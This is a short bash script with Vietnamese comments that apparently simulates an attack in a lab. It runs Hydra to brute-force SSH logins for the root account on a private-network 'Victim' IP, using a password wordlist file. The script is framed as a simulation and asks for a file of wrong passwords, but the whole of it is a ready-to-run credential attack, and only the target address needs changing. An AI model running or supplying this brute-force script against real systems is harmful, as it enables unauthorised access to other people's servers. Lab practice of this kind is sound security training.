TARGET_IP="192.168.254.130"  # IP cua may Victim (chay SSH)
USER="root"                 
PASSWORD_LIST="pass.txt"      # Duong dan den file wordlist
# ==========================

echo "--- Bat dau mo phong tan cong Brute-force (Hydra) ---"
echo "Muc tieu: ssh://${USER}@${TARGET_IP}"
echo "Su dung Password List: ${PASSWORD_LIST}"

# Kiem tra xem file password co ton tai khong
if [ ! -f "$PASSWORD_LIST" ]; then
    echo "[LOI] Khong tim thay file password list tai: $PASSWORD_LIST"
    echo "Vui long tao mot file 'pass.txt' chua cac mat khau sai de thu nghiem."
    exit 1
fi


hydra -t 4 -l ${USER} -P ${PASSWORD_LIST} ssh://${TARGET_IP}

echo "--- Mo phong Brute-force hoan tat ---"